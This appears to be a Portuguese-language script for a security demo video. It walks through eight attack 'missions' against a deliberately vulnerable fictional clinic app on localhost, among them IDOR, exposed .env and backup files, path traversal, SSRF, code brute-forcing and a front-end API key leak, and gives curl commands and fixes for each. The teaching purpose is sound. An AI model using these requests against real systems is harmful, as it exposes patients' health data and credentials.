# 🎯 GUIA DE MISSÕES — Clínica VidaPlena (roteiro do V1)

> O APP: uma clínica de verdade — 12 anos, 8 mil pacientes, portal do paciente, painel interno, assistente virtual.
> É a nossa própria clínica (fictícia). TODOS os ataques rodam em `localhost:3400`. Dados 100% fictícios.
> **Contexto de ouro pra narrativa:** "aqui tem CPF, prontuário, financeiro… imagina isso na vida real."

---

## MISSÃO 01 · IDOR — o prontuário de outro paciente
**Login:** mariana@exemplo.com (paciente comum)
```bash
curl "http://localhost:3400/api/agendamentos/103?token=tok_mariana_4d1"
```
**O que prova:** trocando o número, a Mariana lê o agendamento do **Bruno** — incluindo a **observação médica** ("paciente relata insônia e ansiedade"). Dado de saúde. LGPD. A API busca só pelo ID.
**A correção:** filtro de dono em toda query + RLS.

## MISSÃO 02 · `.env` exposto — as chaves da clínica
```bash
curl "http://localhost:3400/.env"
```
**O que prova:** senha do banco, chave do SMTP, token do WhatsApp, chave da OpenAI — tudo servido pela web.
**A correção:** fora do webroot + bloquear dotfiles + secrets na plataforma + rotação.

## MISSÃO 03 · Painel interno aberto — pacientes, agenda e financeiro
**Login:** qualquer paciente (mariana@exemplo.com)
```bash
curl "http://localhost:3400/api/admin/pacientes?token=tok_mariana_4d1"
curl "http://localhost:3400/api/admin/agenda?token=tok_mariana_4d1"
curl "http://localhost:3400/api/admin/financeiro?token=tok_mariana_4d1"
```
**O que prova:** a paciente número 1 da fila lista **todos os pacientes com CPF e telefone**, a agenda inteira da clínica e o **faturamento do mês (R$ 187 mil)**. A página `/interno` esconde o acesso… mas as rotas não checam NADA.
**A correção:** verificação de permissão no backend em toda rota interna.

## MISSÃO 04 · Código de acesso sem rate limit — brute force
```bash
curl -X POST "http://localhost:3400/api/login/codigo" -H "Content-Type: application/json" -d '{"email":"mariana@exemplo.com","codigo":"0000"}'
# ...tentativas ilimitadas... até acertar:
curl -X POST "http://localhost:3400/api/login/codigo" -H "Content-Type: application/json" -d '{"email":"mariana@exemplo.com","codigo":"4815"}'
```
**O que prova:** código de 4 dígitos = 10.000 combinações; sem limite, um script acha em minutos e **entra na conta como se fosse o paciente**.
**A correção:** rate limit + lockout + expiração curta.

## MISSÃO 05 · Path traversal — o exame que vira o cofre
```bash
curl "http://localhost:3400/api/exame?arquivo=../../.env"
```
**O que prova:** o botão "Baixar PDF" do exame aceita caminho sem sanitizar: pedindo um "exame" diferente, o servidor entrega o `.env` da clínica.
**A correção:** sanitizar/whitelist de caminho.

## MISSÃO 06 · SSRF — a foto de perfil que espia por dentro
```bash
curl -X POST "http://localhost:3400/api/importar-foto" -H "Content-Type: application/json" -d '{"url":"http://localhost:3400/.env"}'
```
**O que prova:** a função "importar foto por link" faz o **servidor** buscar qualquer endereço — inclusive internos. Com instruções mais avançadas, isso vira leitura de rede interna.
**A correção:** whitelist de domínios + bloquear IPs internos.

## MISSÃO 07 · A chave da assistente virtual no front
```bash
curl "http://localhost:3400/app.js" | grep VIDA_AI_KEY
```
**O que prova:** a assistente virtual ("Fale com a Vida") chama a API de IA com a chave embutida no JavaScript — qualquer visitante pega no F12 e usa por conta da clínica.
**A correção:** proxy no backend; chave só no servidor.

## MISSÃO 08 · O backup da clínica exposto
```bash
curl "http://localhost:3400/backup.sql"       # dump com todos os dados e senhas
curl -sI "http://localhost:3400/" | head -8   # servidor se entregando (X-Powered-By, zero headers)
```
**O que prova:** o "mapa do banco" está na pasta pública — com dados e senhas de exemplo — e o servidor conta qual tecnologia usa sem nenhuma proteção.
**A correção:** backup fora do webroot + remover arquivos esquecidos + headers de segurança.

---

## 🎬 ORDEM DE GRAVAÇÃO DO V1 (sugestão)
1. **Abertura:** a clínica bonita (landing + portal + assistente) — "criada com IA, parece perfeita"
2. 📣 **Missão 02 (.env)** — o momento "plateia grita .env"
3. **Missão 01 (IDOR)** — "estou lendo o prontuário de outro paciente"
4. **Missão 03 (painel aberto)** — "eu sou a paciente. E estou vendo o CPF de todo mundo e o faturamento"
5. **Missão 04 (brute force)** — o script entrando na conta
6. **Missão 05 (traversal)** — "pedi um exame, veio a chave da clínica"
7. **Missão 06 (SSRF)** — o servidor obediente
8. **Missão 07 (chave no front)** — os 10 segundos de F12
9. **Missão 08 (backup)** — o fecho que dói
👉 **Gancho final:** "tranquei tudo? Não… eu SÓ ENCONTREI. Agora vem a PARTE 2: blindar."
